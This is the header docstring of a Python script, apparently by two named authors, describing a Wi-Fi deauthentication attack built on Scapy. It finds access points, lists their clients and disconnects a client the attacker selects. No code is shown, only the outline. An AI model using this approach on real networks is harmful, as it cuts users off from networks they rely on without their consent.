'''
Wi-Fi Deauthenticationan Attack script by Sagi Saada and Shlomi Domennko

Description
-----------
This attack first detects APs (routers, gateways) . It then searches for clients that are associated with each AP. The attacker then selects which client to attack, and the client will disconnect from the AP.

Libraries
---------
Scapy
